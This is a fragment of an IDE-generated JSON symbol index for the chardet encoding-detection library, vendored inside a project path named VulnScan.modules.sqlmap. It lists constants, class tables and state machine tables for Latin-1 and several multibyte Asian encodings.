        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "UDF",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "UDF = 0  # undefined\nOTH = 1  # other\nASC = 2  # ascii capital letter\nASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "OTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "OTH = 1  # other\nASC = 2  # ascii capital letter\nASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ASC",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ASC = 2  # ascii capital letter\nASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ASS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ACV",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ACO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ASV",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 28 - 2F",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "ASO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "ASO = 7  # accent small other\nCLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 28 - 2F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 30 - 37",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "CLASS_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "CLASS_NUM = 8  # total classes\nLatin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 28 - 2F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 30 - 37\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 38 - 3F",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "Latin1_CharToClass",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "Latin1_CharToClass = (\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 00 - 07\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 08 - 0F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 10 - 17\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 18 - 1F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 20 - 27\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 28 - 2F\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 30 - 37\n    OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,   # 38 - 3F\n    OTH, ASC, ASC, ASC, ASC, ASC, ASC, ASC,   # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "Latin1ClassModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "Latin1ClassModel = (\n# UDF OTH ASC ASS ACV ACO ASV ASO\n    0,  0,  0,  0,  0,  0,  0,  0,  # UDF\n    0,  3,  3,  3,  3,  3,  3,  3,  # OTH\n    0,  3,  3,  3,  3,  3,  3,  3,  # ASC\n    0,  3,  3,  3,  1,  1,  3,  3,  # ASS\n    0,  3,  3,  3,  1,  2,  1,  2,  # ACV\n    0,  3,  3,  3,  3,  3,  3,  3,  # ACO\n    0,  3,  1,  3,  1,  1,  1,  3,  # ASV\n    0,  3,  1,  3,  1,  1,  3,  3,  # ASO",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "MultiByteCharSetProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcharsetprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcharsetprober",
        "peekOfCode": "class MultiByteCharSetProber(CharSetProber):\n    \"\"\"\n    MultiByteCharSetProber\n    \"\"\"\n    def __init__(self, lang_filter=None):\n        super(MultiByteCharSetProber, self).__init__(lang_filter=lang_filter)\n        self.distribution_analyzer = None\n        self.coding_sm = None\n        self._last_char = [0, 0]\n    def reset(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcharsetprober",
        "documentation": {}
    },
    {
        "label": "MBCSGroupProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcsgroupprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcsgroupprober",
        "peekOfCode": "class MBCSGroupProber(CharSetGroupProber):\n    def __init__(self, lang_filter=None):\n        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)\n        self.probers = [\n            UTF8Prober(),\n            SJISProber(),\n            EUCJPProber(),\n            GB2312Prober(),\n            EUCKRProber(),\n            CP949Prober(),",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcsgroupprober",
        "documentation": {}
    },
    {
        "label": "BIG5_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "BIG5_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07    #allow 0x00 as legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "BIG5_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "BIG5_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,#08-0f\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START#10-17\n)\nBIG5_CHAR_LEN_TABLE = (0, 1, 1, 2, 0)\nBIG5_SM_MODEL = {'class_table': BIG5_CLS,\n                 'class_factor': 5,\n                 'state_table': BIG5_ST,\n                 'char_len_table': BIG5_CHAR_LEN_TABLE,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "BIG5_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "BIG5_CHAR_LEN_TABLE = (0, 1, 1, 2, 0)\nBIG5_SM_MODEL = {'class_table': BIG5_CLS,\n                 'class_factor': 5,\n                 'state_table': BIG5_ST,\n                 'char_len_table': BIG5_CHAR_LEN_TABLE,\n                 'name': 'Big5'}\n# CP949\nCP949_CLS  = (\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,0,0,  # 00 - 0f\n    1,1,1,1,1,1,1,1, 1,1,1,0,1,1,1,1,  # 10 - 1f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "BIG5_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "BIG5_SM_MODEL = {'class_table': BIG5_CLS,\n                 'class_factor': 5,\n                 'state_table': BIG5_ST,\n                 'char_len_table': BIG5_CHAR_LEN_TABLE,\n                 'name': 'Big5'}\n# CP949\nCP949_CLS  = (\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,0,0,  # 00 - 0f\n    1,1,1,1,1,1,1,1, 1,1,1,0,1,1,1,1,  # 10 - 1f\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,1,1,  # 20 - 2f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "CP949_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "CP949_ST = (\n#cls=    0      1      2      3      4      5      6      7      8      9  # previous state =\n    MachineState.ERROR,MachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,     4,     5,MachineState.ERROR,     6, # MachineState.START\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR, # MachineState.ERROR\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME, # MachineState.ITS_ME\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START, # 3\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START, # 4\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START, # 5\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START, # 6\n)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "CP949_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "CP949_CHAR_LEN_TABLE = (0, 1, 2, 0, 1, 1, 2, 2, 0, 2)\nCP949_SM_MODEL = {'class_table': CP949_CLS,\n                  'class_factor': 10,\n                  'state_table': CP949_ST,\n                  'char_len_table': CP949_CHAR_LEN_TABLE,\n                  'name': 'CP949'}\n# EUC-JP\nEUCJP_CLS = (\n    4,4,4,4,4,4,4,4,  # 00 - 07\n    4,4,4,4,4,4,5,5,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "CP949_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "CP949_SM_MODEL = {'class_table': CP949_CLS,\n                  'class_factor': 10,\n                  'state_table': CP949_ST,\n                  'char_len_table': CP949_CHAR_LEN_TABLE,\n                  'name': 'CP949'}\n# EUC-JP\nEUCJP_CLS = (\n    4,4,4,4,4,4,4,4,  # 00 - 07\n    4,4,4,4,4,4,5,5,  # 08 - 0f\n    4,4,4,4,4,4,4,4,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCJP_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCJP_CLS = (\n    4,4,4,4,4,4,4,4,  # 00 - 07\n    4,4,4,4,4,4,5,5,  # 08 - 0f\n    4,4,4,4,4,4,4,4,  # 10 - 17\n    4,4,4,5,4,4,4,4,  # 18 - 1f\n    4,4,4,4,4,4,4,4,  # 20 - 27\n    4,4,4,4,4,4,4,4,  # 28 - 2f\n    4,4,4,4,4,4,4,4,  # 30 - 37\n    4,4,4,4,4,4,4,4,  # 38 - 3f\n    4,4,4,4,4,4,4,4,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCJP_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCJP_ST = (\n          3,     4,     3,     5,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n     MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n     MachineState.ITS_ME,MachineState.ITS_ME,MachineState.START,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#10-17\n     MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     3,MachineState.ERROR,#18-1f\n          3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START#20-27\n)\nEUCJP_CHAR_LEN_TABLE = (2, 2, 2, 3, 1, 0)\nEUCJP_SM_MODEL = {'class_table': EUCJP_CLS,\n                  'class_factor': 6,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCJP_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCJP_CHAR_LEN_TABLE = (2, 2, 2, 3, 1, 0)\nEUCJP_SM_MODEL = {'class_table': EUCJP_CLS,\n                  'class_factor': 6,\n                  'state_table': EUCJP_ST,\n                  'char_len_table': EUCJP_CHAR_LEN_TABLE,\n                  'name': 'EUC-JP'}\n# EUC-KR\nEUCKR_CLS  = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCJP_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCJP_SM_MODEL = {'class_table': EUCJP_CLS,\n                  'class_factor': 6,\n                  'state_table': EUCJP_ST,\n                  'char_len_table': EUCJP_CHAR_LEN_TABLE,\n                  'name': 'EUC-JP'}\n# EUC-KR\nEUCKR_CLS  = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCKR_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCKR_ST = (\n    MachineState.ERROR,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START #08-0f\n)\nEUCKR_CHAR_LEN_TABLE = (0, 1, 2, 0)\nEUCKR_SM_MODEL = {'class_table': EUCKR_CLS,\n                'class_factor': 4,\n                'state_table': EUCKR_ST,\n                'char_len_table': EUCKR_CHAR_LEN_TABLE,\n                'name': 'EUC-KR'}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCKR_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCKR_CHAR_LEN_TABLE = (0, 1, 2, 0)\nEUCKR_SM_MODEL = {'class_table': EUCKR_CLS,\n                'class_factor': 4,\n                'state_table': EUCKR_ST,\n                'char_len_table': EUCKR_CHAR_LEN_TABLE,\n                'name': 'EUC-KR'}\n# EUC-TW\nEUCTW_CLS = (\n    2,2,2,2,2,2,2,2,  # 00 - 07\n    2,2,2,2,2,2,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCKR_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCKR_SM_MODEL = {'class_table': EUCKR_CLS,\n                'class_factor': 4,\n                'state_table': EUCKR_ST,\n                'char_len_table': EUCKR_CHAR_LEN_TABLE,\n                'name': 'EUC-KR'}\n# EUC-TW\nEUCTW_CLS = (\n    2,2,2,2,2,2,2,2,  # 00 - 07\n    2,2,2,2,2,2,0,0,  # 08 - 0f\n    2,2,2,2,2,2,2,2,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCTW_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCTW_CLS = (\n    2,2,2,2,2,2,2,2,  # 00 - 07\n    2,2,2,2,2,2,0,0,  # 08 - 0f\n    2,2,2,2,2,2,2,2,  # 10 - 17\n    2,2,2,0,2,2,2,2,  # 18 - 1f\n    2,2,2,2,2,2,2,2,  # 20 - 27\n    2,2,2,2,2,2,2,2,  # 28 - 2f\n    2,2,2,2,2,2,2,2,  # 30 - 37\n    2,2,2,2,2,2,2,2,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCTW_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCTW_ST = (\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,     3,     3,     3,     4,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,MachineState.ERROR,#10-17\n    MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n         5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.START,MachineState.START,#20-27\n    MachineState.START,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START #28-2f\n)\nEUCTW_CHAR_LEN_TABLE = (0, 0, 1, 2, 2, 2, 3)\nEUCTW_SM_MODEL = {'class_table': EUCTW_CLS,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCTW_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCTW_CHAR_LEN_TABLE = (0, 0, 1, 2, 2, 2, 3)\nEUCTW_SM_MODEL = {'class_table': EUCTW_CLS,\n                'class_factor': 7,\n                'state_table': EUCTW_ST,\n                'char_len_table': EUCTW_CHAR_LEN_TABLE,\n                'name': 'x-euc-tw'}\n# GB2312\nGB2312_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "EUCTW_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "EUCTW_SM_MODEL = {'class_table': EUCTW_CLS,\n                'class_factor': 7,\n                'state_table': EUCTW_ST,\n                'char_len_table': EUCTW_CHAR_LEN_TABLE,\n                'name': 'x-euc-tw'}\n# GB2312\nGB2312_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "GB2312_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "GB2312_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    3,3,3,3,3,3,3,3,  # 30 - 37\n    3,3,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "GB2312_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "GB2312_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,     3,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,#10-17\n         4,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n    MachineState.ERROR,MachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,#20-27\n    